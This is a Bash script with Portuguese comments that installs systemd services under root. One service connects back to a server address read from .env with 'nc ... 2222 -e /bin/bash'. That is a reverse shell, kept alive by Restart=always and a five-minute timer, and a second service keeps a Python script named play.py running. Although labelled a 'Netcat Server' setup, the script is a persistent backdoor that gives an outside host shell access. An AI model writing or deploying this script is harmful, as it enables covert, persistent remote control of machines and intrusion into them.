#!/bin/bash

source .env

# Verificar se o script está sendo executado como root
if [ "$EUID" -ne 0 ]; then
    echo "Este script precisa ser executado como root."
    exit 1
fi

SERVICE_NC="nc.service"
SERVICE_PY="py.service"
TIMER_NAME="nc.timer"

sudo apt remove netcat-openbsd -y

# Verificar se o Netcat está instalado
if ! command -v nc &> /dev/null; then
    echo "Netcat não está instalado. Por favor, instale o Netcat e execute este script novamente."
    sudo apt install netcat-traditional -y
    exit 1
fi

# Criar arquivo de serviço para netcat
echo "[Unit]
Description=Netcat Server
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=bash -c 'if ! pgrep -x "nc $IP_SERVER" >/dev/null; then nc $IP_SERVER 2222 -e /bin/bash; fi'
User=$USER


[Install]
WantedBy=multi-user.target" > "$SERVICE_FILE/$SERVICE_NC"

# Criar timer para reiniciar o serviço constantemente a cada 5min
echo "[Unit]
Description=Netcat Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
" > "$SERVICE_FILE/$TIMER_NAME"

# Criar arquivo de serviço para python play
echo "[Unit]
Description=Netcat Server
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=bash -c 'if ! pgrep -x "play.py" >/dev/null; then python3 $INIT_DIR/$REPO/tools/play.py; fi'
User=$USER


[Install]
WantedBy=multi-user.target" > "$SERVICE_FILE/$SERVICE_PY"

# Recarregar serviços do systemd
sudo systemctl daemon-reload

# Iniciar e habilitar o serviço nc
sudo systemctl unmask '$SERVICE_NC'
sudo systemctl start '$SERVICE_NC'
sudo systemctl enable '$SERVICE_NC'
sudo systemctl unmask '$TIMER_NAME'
sudo systemctl start '$TIMER_NAME'
sudo systemctl enable '$TIMER_NAME'
sudo systemctl unmask '$SERVICE_PY'
sudo systemctl start '$SERVICE_PY'
sudo systemctl enable '$SERVICE_PY'

echo "Configuração do serviço Netcat concluída."